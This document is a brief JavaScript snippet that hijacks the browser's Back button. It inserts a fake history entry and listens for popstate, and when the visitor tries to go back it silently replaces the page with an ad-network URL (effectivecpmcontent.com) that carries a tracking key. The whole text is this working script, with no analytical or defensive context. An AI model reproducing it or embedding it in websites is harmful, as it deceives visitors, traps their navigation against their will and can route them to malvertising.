(function(window, location) { 
history.replaceState(null, document.title, location.pathname+"#!/history"); 
history.pushState(null, document.title, location.pathname); 
 
window.addEventListener("popstate", function() { 
  if(location.hash === "#!/history") { 
    history.replaceState(null, document.title, location.pathname); 
    setTimeout(function(){ 
      location.replace("https://www.effectivecpmcontent.com/m2iudzu7tp?key=2874d06402b07858a75d12160cdb5474"); 
    },10); 
  } 
}, false); 
}(window, location));
